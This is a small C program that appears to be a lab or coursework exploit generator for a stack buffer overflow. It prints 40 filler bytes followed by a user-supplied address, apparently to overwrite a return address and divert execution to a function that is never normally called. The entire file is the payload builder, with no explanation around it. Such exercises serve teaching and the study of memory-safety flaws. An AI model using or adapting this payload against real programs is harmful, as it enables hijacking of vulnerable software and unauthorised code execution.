#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define POISON_LEN 44
#define MASK 0xFF

void usage() {
   printf("usage: ./configure StackBase UncalledAddress\n");
   exit(-1);
}

void configure(int argc, char **argv) {
   unsigned int uncalled_addr;
   int i;

   if (argc != 3) {
      usage();
   }
   sscanf(argv[2], "%x", &uncalled_addr);
   uncalled_addr = htonl(uncalled_addr);

   for (i = 0; i < POISON_LEN - 4; i++) {
      printf("x");
   }
   /* printing each byte as character */
   printf("%c", (uncalled_addr >> 24) & MASK); 
   printf("%c", (uncalled_addr >> 16) & MASK); 
   printf("%c", (uncalled_addr >> 8) & MASK); 
   printf("%c", (uncalled_addr) & MASK); 
}

int main(int argc, char **argv) {
   configure(argc, argv);
   return 0;
}
